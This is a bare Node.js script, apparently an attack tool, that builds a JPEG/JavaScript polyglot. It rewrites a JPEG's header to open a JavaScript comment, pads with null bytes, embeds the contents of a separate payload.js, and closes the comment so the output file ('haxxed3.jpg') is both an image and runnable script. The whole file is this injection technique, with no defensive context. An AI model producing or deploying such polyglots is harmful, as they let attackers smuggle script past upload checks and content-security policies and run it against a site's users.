const fs = require("fs");

var a = fs.readFileSync("neworig.jpg");
var b = a.toString("hex");
var c = b.substr(0, 8) + Buffer.from("/*").toString("hex") + b.substr(12, 28);
var inj = fs.readFileSync("payload.js");
var l = inj.length;
var nulllen = 12074 - 16 - l;
var d = Array(nulllen).fill("00").join("");
inj = inj.toString();
var e = inj
  .split("")
  .map(function (e) {
    return e.charCodeAt(0).toString(16);
  })
  .join("");
var f =
  b.substr(40, b.length - 12) +
  Buffer.from("*///").toString("hex") +
  b.substr(b.length - 4, 4);
var g = c + d + e + f;
var h = new Buffer(g, "hex");
var i = fs.writeFileSync("haxxed3.jpg", h);
